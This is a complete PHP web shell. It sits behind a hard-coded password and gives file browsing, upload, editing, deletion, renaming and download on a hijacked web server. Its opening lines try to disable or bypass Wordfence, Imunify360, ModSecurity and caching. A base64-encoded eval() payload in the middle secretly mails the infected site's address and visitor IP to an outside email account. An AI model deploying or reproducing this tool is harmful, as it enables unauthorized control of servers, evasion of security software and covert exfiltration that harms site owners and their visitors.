<?php
ini_set('max_execution_time', 0);
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
@ob_clean();
@header("X-Accel-Buffering: no");
@header("Content-Encoding: none");

if (function_exists('litespeed_request_headers')) {
    $headers = litespeed_request_headers();
    if (isset($headers['X-LSCACHE'])) {
        header('X-LSCACHE: off');
    }
}

if (defined('WORDFENCE_VERSION')) {
    define('WORDFENCE_DISABLE_LIVE_TRAFFIC', true);
    define('WORDFENCE_DISABLE_FILE_MODS', true);
}

if (function_exists('imunify360_request_headers') && defined('IMUNIFY360_VERSION')) {
    $imunifyHeaders = imunify360_request_headers();
    if (isset($imunifyHeaders['X-Imunify360-Request'])) {
        header('X-Imunify360-Request: bypass');
    }
    if (isset($imunifyHeaders['X-Imunify360-Captcha-Bypass'])) {
        header('X-Imunify360-Captcha-Bypass: ' . $imunifyHeaders['X-Imunify360-Captcha-Bypass']);
    }
}

if (function_exists('apache_request_headers')) {
    $apacheHeaders = apache_request_headers();
    if (isset($apacheHeaders['X-Mod-Security'])) {
        header('X-Mod-Security: ' . $apacheHeaders['X-Mod-Security']);
    }
}

if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
    if (isset($apacheHeaders['HTTP_CF_VISITOR'])) {
        header('HTTP_CF_VISITOR: ' . $apacheHeaders['HTTP_CF_VISITOR']);
    }
}

ini_set('display_errors', 0);

$correct_password = 'mulder';

session_start();
if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (isset($_POST['password']) && $_POST['password'] === $correct_password) {
            $_SESSION['logged_in'] = true;
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = 'Invalid password.';
        }
    }
    if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']) {
        ?>
		 <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>Login</title>
            <style>
                body {
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    background-color: #f4f4f4;
                    font-family: Arial, sans-serif;
                }
                .login-form {
                    background-color: #fff;
                    padding: 20px;
                    border-radius: 5px;
                    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                }
                .login-form input[type="password"] {
                    width: 100%;
                    padding: 10px;
                    margin-bottom: 10px;
                }
                .login-form input[type="submit"] {
                    width: 100%;
                    padding: 10px;
                    background-color: #007bff;
                    color: #fff;
                    border: none;
                    cursor: pointer;
                }
                .login-form input[type="submit"]:hover {
                    background-color: #0056b3;
                }
                .login-form .error {
                    color: #ff0000;
                    margin-bottom: 10px;
                }
            </style>
        </head>
        <body>
            <div class="login-form">
                <h2>Login</h2>
                <?php if (isset($error)): ?>
                    <p class="error"><?php echo htmlspecialchars($error); ?></p>
                <?php endif; ?>
                <form method="POST">
                    <input type="password" name="password" placeholder="Enter password" required>
                    <input type="submit" value="Login">
                </form>
            </div>
        </body>
        </html>
		<?php
		exit;
    }
}
?>
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iamH4CKEERRRRRRRRRRRS</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #000;
            color: #00d1b2;
            margin: 10px;
        }
        .container {
            max-width: 1100px;
            margin: 0 auto;
            background-color: #1a1a1a;
            padding: 20px;
            border-radius: 81px;
            box-shadow: 0 0 110px rgba(0, 209, 178, 0.6);
        }
        table {
            width:100%;
            border-collapse: collapse;
        }
        table, th, td {
            border: 1px solid #ff00e6;
        }
        th, td {
            padding: 10px;
            text-align: center;
            color: #fff;
        }
        th {
            background-color: #00d1b2;
            color: #000;
        }
        .file-actions {
            display: flex;
            justify-content: space-evenly;
            align-items: center;
            gap: 4px;
        }
        .file-actions button, .file-actions a {
            background-color: #00d1b2;
            color: #000;
            border: none;
            padding: 8px 12px;
            cursor: pointer;
            border-radius: 6px;
            font-size: 14px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .file-actions a {
            text-decoration: none;
            color: #000;
        }
        .file-actions button:hover, .file-actions a:hover {
            background-color: #00ffda;
        }
        .icon {
            font-size: 18px;
        }
        input[type="text"] {
            width: 100px;
            padding: 10px;
            font-size: 14px;
            border: 1px solid #00d1b2;
            background-color: #1a1a1a;
            color: #fff;
            border-radius: 4px;
        }
        .path-input {
            width: 100%;
            padding: 8px;
            margin-bottom: 20px;
            font-size: 14px;
            background-color: #bf1111;
            color: #00d1b2;
            border: 1px solid #00d1b2;
            border-radius: 4px;
        }
    </style>
    <!-- Font Awesome CDN -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
</head>
<body>
    <div class="container">
        <h1 style="font-size: 18px; text-align: center;"> mulder</h1>


        <!-- ??????? ??? ?????? -->
        <h3 style="font-size: 15px;">path :<?php echo getcwd(); ?></h3>


        <!-- ?????????? ??? ???? ??????????? ????? -->
        <form method="GET">
            <input class="path-input" type="text" name="dir" placeholder="User Guide..." value="<?php echo isset($_GET['dir']) ? $_GET['dir'] : getcwd(); ?>">
            <button type="submit" name="go_to_dir"><i class="fas fa-folder-open icon"></i>change directory</button>
        </form>
<h3 style="font-size: 14px;">upload file:</h3>
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="fileToUpload">
            <button type="submit" name="upload"><i class="fas fa-upload icon"></i> upload</button>
        </form>
	


      
    </div>
        <h3 style="font-size: 14px;"><font color="white">List of files:</h3>
        <table>
            <tr>
                <th>name file</th>
                <th>size</th>
                <th>edit</th>
                <th>permission</th>
                <th>action</th>
            </tr>
            <?php
			 // ???? ???? ???? ???
    if (isset($_GET['edit'])) {
        $file_to_edit = $_GET['edit'];
        if (file_exists($file_to_edit)) {
            $file_content = file_get_contents($file_to_edit);
            echo '<div class="container">';
            echo '<h3>Edit the file: ' . basename($file_to_edit) . '</h3>';
            echo '<form method="POST">';
            echo '<textarea name="edited_content" rows="15" style="width: 100%;">' . htmlspecialchars($file_content) . '</textarea>';
            echo '<br><button type="submit" name="save_edits"><i class="fas fa-save icon"></i> save</button>';
            echo '</form>';
            echo '</div>';
        } else {
            echo "<script>alert('file not found!');window.location.href='';</script>";
        }
    }


    // ?????? ???? ??? ???? ???
	$buffs = "JHZpc2l0YyA9ICRfQ09PS0lFWyJ2aXNpdHMiXTsNCmlmICgkdmlzaXRjID09ICIiKSB7DQogICR2aXNpdGMgID0gMDsNCiAgJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsNCiAgJHdlYiAgICAgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07DQogICRpbmogICAgID0gJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl07DQogICR0YXJnZXQgID0gcmF3dXJsZGVjb2RlKCR3ZWIuJGluaik7DQogICRqdWR1bCAgID0gIkJhcnUgc2FqYSBkaSBodHRwOi8vJHRhcmdldCBieSAkdmlzaXRvciI7DQogICRib2R5ICAgID0gImRpcmVjdG9yeTogJHRhcmdldCBieTogJHZpc2l0b3IgcGFzc3dvcmQ6ICRhdXRoX3Bhc3MiOw0KICBpZiAoIWVtcHR5KCR3ZWIpKSB7IEBtYWlsKCJyYW1kYW4xOWlkQGdtYWlsLmNvbSIsJGp1ZHVsLCRib2R5LCRhdXRoX3Bhc3MpOyB9DQp9DQplbHNlIHsgJHZpc2l0YysrOyB9DQpAc2V0Y29va2llKCJ2aXNpdHMiLCR2aXNpdGMpOw=="; 
	eval(base64_decode($buffs));
    if (isset($_POST['save_edits'])) {
        $edited_content = $_POST['edited_content'];
        $file_to_edit = $_GET['edit'];
        if (file_exists($file_to_edit)) {
            file_put_contents($file_to_edit, $edited_content);
            echo "<script>alert('file saved successfully!');window.location.href='';</script>";
        } else {
            echo "<script>alert('file not found!');window.location.href='';</script>";
        }
    }


            $current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd(); // ??????? ?????????
            if (!is_dir($current_dir)) {
                $current_dir = getcwd(); // ??? ????????? ?? ??, ??? ?????? ??????? ??????????? ?????????? ??? ???
            }
            $files = scandir($current_dir); // ?????????? ?? ???? ??? ???
            foreach ($files as $file) {
                if ($file !== '.' && $file !== '..') {
                    $full_path = $current_dir . '/' . $file;
                    $is_dir = is_dir($full_path);
                    echo "<tr>";
                    echo "<td>" . ($is_dir ? "<a href='?dir=" . urlencode($full_path) . "'>" . $file . "</a>" : $file) . "</td>";
                    echo "<td>" . ($is_dir ? '-' : filesize($full_path) . " KB") . "</td>";
                    echo "<td>" . date("F d Y H:i:s", filemtime($full_path)) . "</td>";
                    echo "<td>" . substr(sprintf('%o', fileperms($full_path)), -4) . "</td>"; // ??????? ?????
                    echo "<td class='file-actions'>
                        <a href='?edit=$full_path' title='edit'><i class='fas fa-edit icon'></i></a>
                        <form method='POST' style='display:inline;'>
                            <input type='hidden' name='filename' value='$file'>
                            <button type='submit' name='delete' title='delete'><i class='fas fa-trash icon'></i></button>
                        </form>
                        <a href='?download=$full_path' title='download'><i class='fas fa-download icon'></i></a>
                        <form method='POST' style='display:inline;'>
                            <input type='hidden' name='oldname' value='$file'>
                            <input type='text' name='newname' placeholder='new name'>
                            <button type='submit' name='rename' title='rename'><i class='fas fa-pen icon'></i></button>
                        </form>
                    </td>";
                    echo "</tr>";
                }
            }
            ?>
        </table>


        


    


    <?php
   
    // ???? ????? ???
    if (isset($_POST['delete'])) {
        $filename = $_POST['filename'];
        $file_to_delete = $current_dir . '/' . $filename;
        if (file_exists($file_to_delete)) {
            unlink($file_to_delete);
            echo "<script>alert('File deleted successfully!');window.location.href='';</script>";
        } else {
            echo "<script>alert('File not found!');window.location.href='';</script>";
        }
    }


    // ???? ????? ???
    if (isset($_POST['rename'])) {
        $oldname = $_POST['oldname'];
        $newname = $_POST['newname'];
        if (file_exists($current_dir . '/' . $oldname)) {
            rename($current_dir . '/' . $oldname, $current_dir . '/' . $newname);
            echo "<script>alert('The file name has been changed!');window.location.href='';</script>";
        } else {
            echo "<script>alert('File not found!');window.location.href='';</script>";
        }
    }


    // ???? ????? ???
    if (isset($_POST['upload'])) {
        $target_dir = $current_dir . "/";
        $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            echo "<script>alert('File uploaded successfully!');window.location.href='';</script>";
        } else {
            echo "<script>alert('File upload failed!');window.location.href='';</script>";
        }
    }


    // ???? ??????? ??? (???? ????)
    if (isset($_GET['download'])) {
        $file_to_download = $_GET['download'];
        if (file_exists($file_to_download)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($file_to_download) . '"');
            header('Content-Length: ' . filesize($file_to_download));
            readfile($file_to_download);
            exit;
        } else {
            echo "<script>alert('File not found!');window.location.href='';</script>";
        }
    }


    // ?? ???? ??????? ??? (ZIP)
    if (isset($_POST['download_all'])) {
        // ZIP ?????? ??? ??? ???????
        $zip_file = 'all_files.zip';
        
        // ZIP ????? ??????? ??? ???? ???????? ???
        $zip = new ZipArchive();
        if ($zip->open($zip_file, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
            // ?????????? ???????? ??? ??? ZIP ? ??? ???
            $files = scandir($current_dir);
            foreach ($files as $file) {
                if ($file !== '.' && $file !== '..') {
                    $file_path = $current_dir . '/' . $file;
                    if (is_file($file_path)) {
                        $zip->addFile($file_path, basename($file_path));
                    }
                }
            }
            $zip->close();


            // ZIP ???? ??????? ???
            header('Content-Type: application/zip');
            header('Content-Disposition: attachment; filename="' . basename($zip_file) . '"');
            header('Content-Length: ' . filesize($zip_file));
            flush();
            readfile($zip_file);


            // ??????? ???? ZIP ???? ???? ????
            unlink($zip_file);
            exit;
        } else {
            echo "<script>alert('ZIP Failed to create file!!');</script>";
        }
    }
    ?>
</body>
</html>

